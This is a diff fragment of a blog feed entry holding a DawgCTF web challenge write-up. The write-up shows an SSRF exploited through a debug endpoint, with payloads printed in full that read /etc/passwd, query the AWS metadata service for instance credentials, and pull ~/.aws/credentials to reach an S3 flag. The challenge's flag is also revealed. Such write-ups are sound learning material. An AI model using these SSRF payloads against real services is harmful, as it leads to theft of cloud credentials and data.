 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/vhost-3.png&quot; alt=&quot;vhost&quot; /&gt;
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/api-1.png&quot; alt=&quot;api&quot; /&gt;
@@ -626,13 +1173,13 @@ and I got some other endpoints&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/apiFuzz-1.png&quot; alt=&quot;disearch-api&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;now only &lt;code class=&quot;highlighter-rouge&quot;&gt;/reports&lt;/code&gt; caught my eye but it’s forbiden &lt;strong&gt;hmmmmmmmmmm&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;now only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/reports&lt;/code&gt; caught my eye but it’s forbiden &lt;strong&gt;hmmmmmmmmmm&lt;/strong&gt;:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/apiReports-1.png&quot; alt=&quot;api-reports&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;I also guessed &lt;code class=&quot;highlighter-rouge&quot;&gt;/reporters&lt;/code&gt; because you know it makes sense, it’s also forbiden :(&lt;/p&gt;
+&lt;p&gt;I also guessed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/reporters&lt;/code&gt; because you know it makes sense, it’s also forbiden :(&lt;/p&gt;
 
-&lt;p&gt;after examining the header we found out that we can bypass the protection with the api key from the /debug on the first domain, with some trial and error we found out that it’s the &lt;code class=&quot;highlighter-rouge&quot;&gt;api-key&lt;/code&gt; header&lt;/p&gt;
+&lt;p&gt;after examining the header we found out that we can bypass the protection with the api key from the /debug on the first domain, with some trial and error we found out that it’s the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api-key&lt;/code&gt; header&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/apiReports-2.png&quot; alt=&quot;reports&quot; /&gt;
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/reporters.png&quot; alt=&quot;reporters&quot; /&gt;&lt;/p&gt;
@@ -655,14 +1202,14 @@ I just started screaming because it was the only thing I wanted for hours&lt;/p&
 http://api.rbtrust.internal/debug?url_48902=file:///etc/passwd&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/etcpasswd-1.png&quot; alt=&quot;etc/passwd&quot; /&gt;
-we can see &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/jobert&lt;/code&gt; so the flag should be &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/jobert/flag.txt&lt;/code&gt;&lt;/p&gt;
+we can see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/jobert&lt;/code&gt; so the flag should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/jobert/flag.txt&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;YES YES, STILL ARE WE F***CKING DONE YET&lt;/strong&gt;
 &lt;strong&gt;NO, there’s still alot of pain and sacrifice&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;at this point there was still 30 minutes for the CTF and I need the flag&lt;/p&gt;
 
-&lt;p&gt;so the hints have something to do with &lt;code class=&quot;highlighter-rouge&quot;&gt;$CLOUD_SERVER&lt;/code&gt; or whatever
+&lt;p&gt;so the hints have something to do with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$CLOUD_SERVER&lt;/code&gt; or whatever
 from the /debug we can clearly see it’s an aws, so we started playing around with aws stuff
 the only useful thing we found was this http://api.rbtrust.internal/debug?url_48902=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&lt;/p&gt;
 
@@ -674,9 +1221,9 @@ the only useful thing we found was this http://api.rbtrust.internal/debug?url_48
 &lt;p&gt;there was no flag or anything important so we got a good idea about s3 buckets
 anddddd the keys for the s3 was wrong :(&lt;/p&gt;
 
-&lt;p&gt;15 mins left and still nothing WTF, my teammate was like &lt;code class=&quot;highlighter-rouge&quot;&gt;I need the f***ing flag&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;15 mins left and still nothing WTF, my teammate was like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I need the f***ing flag&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;so after reading some writeups and stuff we discovered that the aws keys are in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/jobert/.aws/credentials&lt;/code&gt;
+&lt;p&gt;so after reading some writeups and stuff we discovered that the aws keys are in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/jobert/.aws/credentials&lt;/code&gt;
 and it worked :P&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/jobert.png&quot; alt=&quot;creds&quot; /&gt;&lt;/p&gt;
@@ -697,7 +1244,7 @@ so we had to guess, we had 6 mins left for the CTF my hands were shaking and I d
 &lt;p&gt;I didn’t know what to do, so I had to break it whatever it costs
 after some trial and error I got it&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;aws s3 cp s3://rbtrust-internal/flag.txt ./1 &lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws s3 cp s3://rbtrust-internal/flag.txt ./1 &lt;/code&gt;
 and done it took us 10 hours to finish it&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/Dpoi1z-VsAEQkYA?format=jpg&amp;amp;name=small&quot; alt=&quot;meme&quot; /&gt;
@@ -705,7 +1252,7 @@ submitted 2 mins before the ctf ends :D&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/Final-flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;flag{get_em_uPy4TWP1SQlcaukrU8GPe}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{get_em_uPy4TWP1SQlcaukrU8GPe}&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;only 2 solves :)
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/ww.png&quot; alt=&quot;2 solves&quot; /&gt;&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">the hacker one</summary></entry></feed>
